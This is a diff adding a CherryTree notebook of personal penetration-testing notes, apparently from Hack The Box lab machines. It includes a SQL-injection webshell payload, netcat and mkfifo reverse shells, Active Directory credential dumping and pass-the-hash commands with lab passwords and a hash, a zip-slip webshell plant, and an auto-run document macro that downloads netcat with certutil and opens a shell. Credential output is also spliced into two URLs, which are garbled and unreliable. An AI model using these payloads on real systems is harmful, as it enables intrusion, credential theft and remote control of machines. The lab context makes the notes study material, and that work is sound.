@@ -1,0 +1,772 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Pentest_Buggy!" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588867749.25" ts_lastsave="1589979424.56" unique_id="1">
+		<rich_text>WELCOME!</rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="HOW TO - Enumeration" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588872796.98" ts_lastsave="1589042297.56" unique_id="12">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Nmap Enumeration" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589041225.58" ts_lastsave="1589041250.19" unique_id="31">
+				<rich_text family="monospace">nmap -sC -sV -o nmap.txt IP</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="URL BruteForce pages" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589041061.94" ts_lastsave="1589041206.64" unique_id="30">
+				<rich_text>1. gobuster
+    </rich_text>
+				<rich_text family="monospace" scale="small">gobuster dir -u IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster_php.txt -x php</rich_text>
+				<rich_text>
+
+2. dirb
+
+3. dirbuster </rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="SQL Injection" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589041419.59" ts_lastsave="1589981939.03" unique_id="32">
+				<rich_text scale="h3">1. sqlmap</rich_text>
+				<rich_text>
+• Method ‘Get' Attack:
+
+
+• Method ‘POST’ Attack
+I Prefer the method with </rich_text>
+				<rich_text underline="single">Burp Suite</rich_text>
+				<rich_text>.
+Much easier and less worries.
+→ </rich_text>
+				<rich_text scale="small">Set proxy first, set Preferences-&gt;NetWork Settings-&gt;Proxy port 8080</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text scale="small">→ Copy the POST request to a text file, I have called it search-test.txt and placed it in the sqlmap directory</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text scale="small">→  Run sqlmap as shown here; the option -r tells sqlmap to read the search-test.txt file to get the information to attack in the POST request. -p is the parameter we are attacking.</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text family="monospace" scale="small">./sqlmap.py -r search-test.txt -p parameterstoattack</rich_text>
+				<rich_text>
+
+
+2. Upload webshell using sqlinjection
+If we test a sql vuln using this payload:
+</rich_text>
+				<rich_text family="monospace" scale="small">'  union select 1, 2, 3, 4, 5, version()-- -</rich_text>
+				<rich_text>
+we can use union syntax to upload shell via:
+</rich_text>
+				<rich_text family="monospace" scale="small">' union select &quot;&lt;?php system($_GET['cmd']); ?&gt;&quot;,2,3,4,5,6 into outfile 'C:\\inetpub\\wwwroot\\bad.php' #</rich_text>
+				<rich_text>
+BUT!!! the web root path you should guess it.
+Suggest use the sqlmap's brute force path to try.</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588872821.53" ts_lastsave="1588872821.53" unique_id="13">
+				<rich_text></rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Windows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588872824.77" ts_lastsave="1588873295.22" unique_id="14">
+				<rich_text></rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Normal Enum" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588873260.6" ts_lastsave="1588874919.09" unique_id="15">
+					<rich_text>1. </rich_text>
+					<rich_text family="monospace">enum4liunx -a IP</rich_text>
+					<rich_text> ( all option scan )
+    </rich_text>
+					<rich_text family="monospace">enum4linux -U IP</rich_text>
+					<rich_text> ( found user name )
+
+2. </rich_text>
+					<rich_text family="monospace">smbmap -H IP -u username -p password</rich_text>
+					<rich_text>
+    (you could also only use the -H option)
+
+3. </rich_text>
+					<rich_text family="monospace">smbclient -L IP</rich_text>
+					<rich_text> 
+    to see if there's folder sharing </rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Impacket Tools" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588873295.22" ts_lastsave="1588873464.28" unique_id="16">
+					<rich_text></rich_text>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Remote Execution" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588873394.4" ts_lastsave="1588873552.6" unique_id="17">
+						<rich_text>1. psexec.py
+
+2. smbexec.py
+
+3. atexec.py 
+
+4. wmiexec.py
+
+5. dcomexec.py</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Kerberos" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588873400.63" ts_lastsave="1588874041.55" unique_id="18">
+						<rich_text>1. kerbrute.py
+  </rich_text>
+						<rich_text family="monospace" scale="small">python kerbrute.py -domain EGOTISTICAL-BANK.LOCAL -users usernames.txt -password &quot;test&quot; -outputfile passwords.txt -dc-ip 10.10.10.175 -threads 1000</rich_text>
+						<rich_text>
+  
+2. GetTGT.py
+
+3. GetST.py
+
+4. GetPac.py
+
+5. GetUserSPNs.py
+
+6. GetNPUsers.py
+</rich_text>
+						<rich_text family="monospace" scale="small">GetNPUsers.py EGOTISTICAL-BANK.LOCAL/HugoSauna -format john -outputfile test.txt -dc-ip 10.10.10.175</rich_text>
+						<rich_text>
+
+7. ticketer.py
+
+8. raiseChild.py
+
+9. GetADUsers.py</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Windows Secrets" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588873408.19" ts_lastsave="1588874025.66" unique_id="19">
+						<rich_text>1. secretsdump.py
+
+2. mimikatz.py</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Server Tools/MiTM Attacks" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588873419.43" ts_lastsave="1588874064.09" unique_id="20">
+						<rich_text>1. ntlmrelayx.py
+2. karmaSMB.py
+3. smbserver.py
+</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="WMI" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588873424.78" ts_lastsave="1588874106.9" unique_id="21">
+						<rich_text>1.wmiquery.py
+
+2.wmipersist.py
+</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Known Vulnerabilities" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588873433.39" ts_lastsave="1588874115.71" unique_id="22">
+						<rich_text>1.goldenPac.py
+2.sambaPipe.py
+3.smbrelayx.py</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="SMB/MSRPC" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588873439.7" ts_lastsave="1588874137.52" unique_id="23">
+						<rich_text>1.smbclient.py
+2.addcomputer.py
+3.getArch.py
+4.ifmap.py
+5.lookupsid.py
+6.opdump.py
+7.reg.py
+8.rpcdump.py
+9.samrdump.py
+10.services.py</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="MSSQL / TDS" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588873449.49" ts_lastsave="1588874777.85" unique_id="24">
+						<rich_text>1.mssqlinstance.py
+2.mssqlclient.py</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="File Formats" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588873457.4" ts_lastsave="1588874792.67" unique_id="25">
+						<rich_text>1.esentutl.py
+2.ntfs-read.py
+3.registry-read.py
+</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Other" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588873464.29" ts_lastsave="1588874812.02" unique_id="26">
+						<rich_text>1.findDelegation.py
+2.GetADUsers.py
+3.mqtt_check.py
+4.rdp_check.py
+5.sniff.py
+6.sniffer.py
+7.ping.py</rich_text>
+					</node>
+				</node>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="HOW TO - Reverse Shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588869233.4" ts_lastsave="1588870520.55" unique_id="2">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Pentestmonkey!!!!" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588870520.55" ts_lastsave="1588870522.37" unique_id="8">
+				<rich_text link="webs http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="(Linux) Shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588869254.74" ts_lastsave="1589042690.93" unique_id="6">
+				<rich_text>1. upload nc first, then
+    server side: </rich_text>
+				<rich_text family="monospace" scale="small">nc -e /bin/sh ip 3344</rich_text>
+				<rich_text>
+    or </rich_text>
+				<rich_text family="monospace" scale="small">nc ip 3344 -e /bin/sh</rich_text>
+				<rich_text>
+    or  </rich_text>
+				<rich_text family="monospace" scale="small">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip 3344 &gt;/tmp/f  (this one better but longer)</rich_text>
+				<rich_text>
+    
+    your kali : </rich_text>
+				<rich_text family="monospace" scale="small">nc -lnvp 3344</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="(Windows) Shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588869245.27" ts_lastsave="1588873908.75" unique_id="5">
+				<rich_text>1. </rich_text>
+				<rich_text family="monospace">evil-winrm -i ip -u 'username' -p 'password'</rich_text>
+				<rich_text>
+
+2. upload nc first, then
+    server side: </rich_text>
+				<rich_text family="monospace">.\nc.exe -e powershell ip 3344</rich_text>
+				<rich_text>
+    your kali : </rich_text>
+				<rich_text family="monospace">nc -lnvp 3344</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="HOW TO - Privilege Escalation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588869462.94" ts_lastsave="1588870962.68" unique_id="7">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588870762.94" ts_lastsave="1589042113.41" unique_id="9">
+				<rich_text></rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Enumeration For Privilege Escalation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589042113.41" ts_lastsave="1589982650.03" unique_id="36">
+					<rich_text>Lots of commands helps with pri escalation:
+</rich_text>
+					<rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</rich_text>
+					<rich_text>
+
+1. lse.sh
+
+2. linenum.sh
+
+3. Cronjobs
+4. What file can we read ?</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Privilege Escalation Using PATH Variable" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589041598.56" ts_lastsave="1589041666.27" unique_id="33">
+					<rich_text>Knowledge You Should Know:
+</rich_text>
+					<rich_text link="webs https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</rich_text>
+					<rich_text>
+
+</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="GTFOBins" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589041917.25" ts_lastsave="1589041949.44" unique_id="35">
+					<rich_text>Knowledge You Should Know:
+</rich_text>
+					<rich_text link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
+					<rich_text>
+
+</rich_text>
+				</node>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Windows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588870766.9" ts_lastsave="1589042952.57" unique_id="10">
+				<rich_text></rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Enumeration For Privilege Escalation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588936260.53" ts_lastsave="1589695377.39" unique_id="27">
+					<rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20E DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+scalation.md</rich_text>
+					<rich_text>
+
+</rich_text>
+					<rich_text scale="h2">1. PowerUp.ps1</rich_text>
+					<rich_text>
+</rich_text>
+					<rich_text scale="small">&gt; </rich_text>
+					<rich_text family="monospace" scale="small">Import-Module .\PowerUp.ps1</rich_text>
+					<rich_text scale="small">
+&gt; </rich_text>
+					<rich_text family="monospace" scale="small">Invoke-AllChecks | Out-File -Encoding ASCII bug_checks.txt</rich_text>
+					<rich_text>
+
+</rich_text>
+					<rich_text scale="h2">2. Watson</rich_text>
+					<rich_text>
+</rich_text>
+					<rich_text scale="small">Download: </rich_text>
+					<rich_text link="webs https://github.com/rasta-mouse/Watson" scale="small">https://github.com/rasta-mouse/Watson</rich_text>
+					<rich_text scale="small">
+
+First you will need to get the version of .NET being used on the target machine. You can find the installed version in </rich_text>
+					<rich_text family="monospace" scale="small">C:\windows\microsoft.net\framework\</rich_text>
+					<rich_text scale="small">
+
+Next you will need to download the project from the Watson Github Page. The next steps need to be done on a Windows machine or a Windows VM using Visual Studio.
+
+In Visual Studio, you will have the option to open a project folder. Select the Entire folder. Next On the right hand side you will see a file called watson.sln. Double click that to open up the project. Now you will Right click the Project Watson (step 1 in image) and select properties (step 2 in image). Under “application” (step 3), you can set the target framework to the version you would like which should be version 4.0 in our case.</rich_text>
+					<rich_text>
+
+
+</rich_text>
+					<rich_text scale="h2">3. winPEAS !</rich_text>
+					<rich_text>
+</rich_text>
+					<rich_text link="webs https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/treevil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'e/master/winPEAS</rich_text>
+					<rich_text>
+
+(I download it at /root/Desktop/windows_tool)
+→ </rich_text>
+					<rich_text family="monospace" scale="small">.\winPEASx64.exe cmd &gt; run_result.txt</rich_text>
+					<rich_text>
+
+
+</rich_text>
+					<rich_text scale="h2">4. PowerView.ps1</rich_text>
+					<rich_text>
+
+
+</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="AD Attack (Active Directory Attack)" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588870813.41" ts_lastsave="1589695250.27" unique_id="11">
+					<rich_text>The Knowledge you should know:
+• </rich_text>
+					<rich_text link="webs https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</rich_text>
+					<rich_text>
+
+• </rich_text>
+					<rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md</rich_text>
+					<rich_text>
+
+
+• How to check if AD is working ?
+→ run the console utility Dcdiag !
+</rich_text>
+					<rich_text link="webs https://activedirectorypro.com/dcdiag-check-domain-controller-health/" scale="small">https://activedirectorypro.com/dcdiag-check-domain-controller-health/</rich_text>
+					<rich_text>
+→ </rich_text>
+					<rich_text family="monospace" scale="small">dcdiag /s:DC1</rich_text>
+					<rich_text>
+
+
+1. Uplodate SharpHound.exe or SharpHound.ps1
+2. Then execute SharpHound to make the .zip file we need
+in powershell→ </rich_text>
+					<rich_text family="monospace" scale="small">cmd.exe ; .\SharpHound.exe -c all</rich_text>
+					<rich_text>
+
+3.Then open BloodHound -&gt; 
+(Remember open the neo4j database frist)
+→ neo4j start
+→ bloodhound
+
+4. Then load the .zip file to bloodhound
+5. check the path you want to root
+
+For example , if there's a GetChangeAll function could use
+dcsync attack.
+• </rich_text>
+					<rich_text family="monospace" scale="small">lsadump::dcsync /domain:testlab.local /user:Administrator</rich_text>
+					<rich_text>
+</rich_text>
+					<rich_text scale="h3">OR use the secretdump.py !</rich_text>
+					<rich_text>
+• </rich_text>
+					<rich_text family="monospace" scale="small">secretsdump.py 'EGOTISTICALBANK/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'</rich_text>
+					<rich_text>
+
+
+6. Finally, use the new hashes to login as Administrator wtih wmiexec.py
+→ </rich_text>
+					<rich_text family="monospace" scale="small">wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff administrator@10.10.10.175</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Servie Abuse" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589042952.57" ts_lastsave="1589980763.5" unique_id="38">
+					<rich_text>(in RE box)
+
+</rich_text>
+					<rich_text scale="h3">Maybe you can find it via PowerUp.ps1</rich_text>
+					<rich_text>
+
+</rich_text>
+					<rich_text family="monospace" scale="small">PS C:\temp&gt; Import-Module .\PowerUp.ps1
+Import-Module .\PowerUp.ps1
+PS C:\temp&gt; Invoke-AllChecks
+
+[*] Checking service permissions...
+
+
+ServiceName   : UsoSvc
+Path          : C:\tmp\nc64.exe 10.10.14.8 8181 -e cmd.exe
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
+CanRestart    : True</rich_text>
+					<rich_text>
+
+
+So!!!
+</rich_text>
+					<rich_text family="monospace" scale="small">Invoke-ServiceAbuse -Name UsoSvc -Command &quot;C:\bug\nc.exe 10.10.14.133 7788 -e cmd.exe&quot;</rich_text>
+					<rich_text>
+
+</rich_text>
+				</node>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Switch User In Windows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589636180.12" ts_lastsave="1589636811.92" unique_id="39">
+			<rich_text>1.
+</rich_text>
+			<rich_text family="monospace" scale="small">$pass = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ('CONTROL\hector', $pass)
+Invoke-Command -ComputerName sniper -Credential $cred -ScriptBlock { C:\tmp\nc.exe -e cmd.exe 10.10.15.82 1133 }</rich_text>
+			<rich_text>
+
+2.
+</rich_text>
+			<rich_text family="monospace" scale="small">$username = &quot;CONTROL\hector&quot; ; $pw = &quot;l33th4x0rhector&quot;
+$password = $pw | ConvertTo-SecureString -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
+New-PSSession -Credential $cred | Enter-PSSession</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Kill Port Process" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588938521.98" ts_lastsave="1588938527.63" unique_id="28">
+			<rich_text family="monospace">fuser -k 8000/tcp</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Start Simple HTTP Server" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588868358.86" ts_lastsave="1588938534.41" unique_id="4">
+			<rich_text>1. </rich_text>
+			<rich_text family="monospace">pythom -m SimpleHTTPServer</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="(Windows) Download Files" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588867788.75" ts_lastsave="1589043100.85" unique_id="3">
+			<rich_text>1. </rich_text>
+			<rich_text family="monospace">wget </rich_text>
+			<rich_text family="monospace" link="webs http://myIP/myfile">http://myIP:port/myfile</rich_text>
+			<rich_text family="monospace"> -O myfile.exe</rich_text>
+			<rich_text>
+
+2. </rich_text>
+			<rich_text family="monospace">(new-object System.Net.WebClient).DownloadFile('http://ip:port/file.exe', 'Path/file.exe')</rich_text>
+			<rich_text>
+
+3. </rich_text>
+			<rich_text family="monospace">curl http://example.org/picture.jpg -O picture.jpg</rich_text>
+			<rich_text>
+
+4. </rich_text>
+			<rich_text family="monospace">Invoke-WebRequest http://example.org/picture.jpg -O picture.jpg</rich_text>
+			<rich_text>
+
+
+5. Centutil.exe 
+</rich_text>
+			<rich_text link="webs https://wsygoogol.github.io/2018/12/17/%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8CertUtil-exe%E6%A4%8D%E5%85%A5%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/">https://wsygoogol.github.io/2018/12/17/%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8CertUtil-exe%E6%A4%8D%E5%85%A5%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/</rich_text>
+			<rich_text>
+→ </rich_text>
+			<rich_text family="monospace" scale="small">certutil.exe -decode input.txt output.exe</rich_text>
+			<rich_text>
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Linux UnZip Files" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588941439.81" ts_lastsave="1588941881.31" unique_id="29">
+			<rich_text>-------------------------------------------------------------------------------
+Copied from </rich_text>
+			<rich_text link="webs http://note.drx.tw/2008/04/command.html">http://note.drx.tw/2008/04/command.html</rich_text>
+			<rich_text>
+-------------------------------------------------------------------------------
+.tar (僅打包，無壓縮)
+
+    套件名稱：tar。
+    打包：
+
+        [ jonny@linux ~ ]
+        $ tar cvf FileName.tar DirName
+
+    解包：
+
+        [ jonny@linux ~ ]
+        $ tar xvf FileName.tar
+
+
+
+.gz
+
+    套件名稱：gzip。
+    壓縮
+
+        [ jonny@linux ~ ]
+        $ gzip FileName
+
+    解壓縮 1：
+
+        [ jonny@linux ~ ]
+        $ gunzip FileName.gz
+
+    解壓縮 2：
+
+        [ jonny@linux ~ ]
+        $ gzip -d FileName.gz
+
+
+
+.tar.gz
+
+    套件名稱：gzip。
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar zcvf FileName.tar.gz DirName
+
+    解壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar zxvf FileName.tar.gz
+
+
+
+bz
+
+    壓縮：unkown。
+    解壓縮 1：
+
+        [ jonny@linux ~ ]
+        $ bzip2 -d FileName.bz
+
+    解壓縮 2：
+
+        [ jonny@linux ~ ]
+        $ bunzip2 FileName.bz
+
+
+
+.tar.bz
+
+    壓縮：unkown。
+    解壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar jxvf FileName.tar.bz
+
+
+
+.bz2
+
+    套件名稱：bzip2。
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ bzip2 -z FileName
+
+    解壓縮 1：
+
+        [ jonny@linux ~ ]
+        $ bzip2 -d FileName.bz2
+
+    解壓縮 2：
+
+        [ jonny@linux ~ ]
+        $ bunzip2 FileName.bz2
+
+
+
+.tar.bz2
+
+    套件名稱：bzip2。
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar jcvf FileName.tar.bz2 DirName
+
+    解壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar jxvf FileName.tar.bz2
+
+.tar.bz2 (parallel)
+
+    套件名稱：lbzip2。
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar -I lbzip2 -cvf FileName.tar.bz2 DirName
+
+
+
+.xz
+
+    套件名稱：xz-utils。
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ xz -z FileName
+
+    解壓縮：
+
+        [ jonny@linux ~ ]
+        $ xz -d FileName.xz
+
+
+
+.tar.xz
+
+    套件名稱：xz-utils。
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar Jcvf FileName.tar.xz DirName
+
+    解壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar Jxvf FileName.tar.xz
+
+
+
+.Z
+
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ compress FileName
+
+    解壓縮：
+
+        [ jonny@linux ~ ]
+        $ uncompress FileName.Z
+
+
+.tar.Z
+
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar Zcvf FileName.tar.Z DirName
+
+    解壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar Zxvf FileName.tar.Z
+
+
+.tgz
+
+    套件名稱：gzip。
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar zcvf FileName.tgz FileName
+
+    解壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar zxvf FileName.tgz
+
+
+.tar.tgz
+
+    套件名稱：gzip。
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar zcvf FileName.tar.tgz FileName
+
+    解壓縮：
+
+        [ jonny@linux ~ ]
+        $ tar zxvf FileName.tar.tgz
+
+
+.7z
+
+    套件名稱：p7zip-full。
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ 7z a FileName.7z FileName
+
+    使用密碼 (PASSWORD) 壓縮：
+
+        [ jonny@linux ~ ]
+        $ 7z a FileName.7z FileName -pPASSWORD
+
+    解壓縮：
+
+        [ jonny@linux ~ ]
+        $ 7z x FileName.7z
+
+
+.zip
+
+    套件名稱：zip。
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ zip -r FileName.zip DirName
+
+    解壓縮：
+
+        [ jonny@linux ~ ]
+        $ unzip FileName.zip
+
+
+.rar
+
+    套件名稱：rar, unrar。
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ rar a FileName.rar DirName
+
+    解壓縮 1：
+
+        [ jonny@linux ~ ]
+        $ rar e FileName.rar
+
+    解壓縮 2：
+
+        [ jonny@linux ~ ]
+        $ unrar e FileName.rar
+
+    解壓縮 3：在指定目錄內解壓縮。
+
+        [ jonny@linux ~ ]
+        $ rar x FileName.rar DirName
+
+
+.lha
+
+    套件名稱：lha。
+    壓縮：
+
+        [ jonny@linux ~ ]
+        $ lha -a FileName.lha FileName
+
+    解壓縮：
+
+        [ jonny@linux ~ ]
+        $ lha -e FileName.lha
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Cracking Hashes" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589041739.22" ts_lastsave="1589041739.22" unique_id="34">
+			<rich_text></rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Zip Slip Attack" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589042798.26" ts_lastsave="1589980176.34" unique_id="37">
+			<rich_text scale="small">First , </rich_text>
+			<rich_text family="monospace" scale="small">mkdir -p ../../../../inetpub/wwwroot/blog</rich_text>
+			<rich_text scale="small"> in our kali
+then copy the shell to path
+
+root@kali:~/Desktop/htb/RE/zipslip# </rich_text>
+			<rich_text family="monospace" scale="small">cp ../InsomniaShell.aspx &quot;../../../../inetpub/wwwroot/blog/&quot;</rich_text>
+			<rich_text scale="small">
+then zip it
+root@kali:~/Desktop/htb/RE/zipslip# </rich_text>
+			<rich_text family="monospace" scale="small">zip -r note.zip &quot;../../../../inetpub/wwwroot/blog/InsomniaShell.aspx&quot;</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Change Permission In Windows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589638516.98" ts_lastsave="1589638524.61" unique_id="40">
+			<rich_text family="monospace" scale="small">icacls susvc.ps1 /grant Everyone:F</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Find File Content In LINUX" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589639184.0" ts_lastsave="1589639185.7" unique_id="41">
+			<rich_text>find path -name “*.txt” -exec grep -H “content” {} \;</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="HOW TO -Create Evil .ods File" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589979424.57" ts_lastsave="1589979708.61" unique_id="42">
+			<rich_text>First, create a evil .ods file
+</rich_text>
+			<rich_text scale="small">1. </rich_text>
+			<rich_text family="monospace" scale="small">msf5 &gt; use exploit/multi/misc/openoffice_document_macro</rich_text>
+			<rich_text scale="small">
+2. </rich_text>
+			<rich_text family="monospace" scale="small">set target 0</rich_text>
+			<rich_text scale="small">
+3. </rich_text>
+			<rich_text family="monospace" scale="small">set FILENAME payload.ods</rich_text>
+			<rich_text scale="small">
+4. </rich_text>
+			<rich_text family="monospace" scale="small">run</rich_text>
+			<rich_text>
+
+Then , You could set evil command in macro(set it to auto run when openning file)
+
+Also, you could use the cretutil to upload files.
+</rich_text>
+			<rich_text link="webs https://github.com/dyloot43/ods/blob/master/odf.xml">https://github.com/dyloot43/ods/blob/master/odf.xml</rich_text>
+			<rich_text>
+
+smt like this:
+	Sub OnLoad
+	 MkDir &quot;C:\bug&quot;
+	 If Len(Dir(&quot;C:\bug&quot;, vbDirectory)) = 0 Then
+     	 Shell(&quot;certutil.exe -urlcache -split -f 'http://10.10.14.132:8000/test.exe' .\nc.exe&quot;)
+	 End If
+	 Shell(&quot;certutil.exe -urlcache -split -f 'http://10.10.14.132:8000/nc.exe' C:\bug\nc.exe&quot;)
+	 Shell(&quot;C:\bug\nc.exe 10.10.14.132 3344 -e cmd.exe&quot;)
+	End Sub
+</rich_text>
+		</node>
+	</node>
+</cherrytree>
